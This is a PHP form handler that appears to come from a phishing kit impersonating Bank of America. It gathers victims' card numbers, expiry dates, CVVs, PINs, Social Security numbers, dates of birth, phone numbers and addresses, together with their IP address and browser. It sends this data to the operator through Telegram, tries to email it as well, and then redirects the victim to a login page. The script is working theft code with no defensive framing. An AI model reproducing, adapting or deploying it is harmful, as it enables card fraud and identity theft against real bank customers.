<?php
require("email.php");
include("config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
	    $browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $cn = $_POST['cn'];
    $exp = $_POST['exp'];
    $cvv = $_POST['cvv'];
    $pin = $_POST['pin'];
    $ssn = $_POST['ssn'];
	$fname = $_POST['fname'];
    $dob = $_POST['dob'];
    $phone = $_POST['phone'];
    $add = $_POST['add'];
    $zip = $_POST['zip'];
    $serv = $_REQUEST['MainForm'];


    $sender_name = "EM6L3M";
    $sender_mail = "em6l3mlight.log";


        //Telegram send
        $message = "**BofA**CARD_INFO\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "CARD: ".$_POST['cn']."\n";
        $message .= "EXP: ".$_POST['exp']."\n";
        $message .= "CVV: ".$_POST['cvv']."\n";
        $message .= "PIN: ".$_POST['pin']."\n";
        $message .= "SSN: ".$_POST['ssn']."\n";
        $message .= "NAME: ".$_POST['fname']."\n";
        $message .= "DOB: ".$_POST['dob']."\n";
        $message .= "PHONE: ".$_POST['phone']."\n";
        $message .= "ADDRESS: ".$_POST['add']."\n";
        $message .= "ZIP: ".$_POST['zip']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Main Content
        $main_subject = "CARD INFORMATIONS 1 $ip";
        $main_body = "<p>
        -----------------------------------------<p>
        User-Agent : $_SERVER
        -----------------------------------------<p>
        Date : $DATE";
        
        
//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
         $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n $uid\r\n ","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
	header("location:login.html");
?>
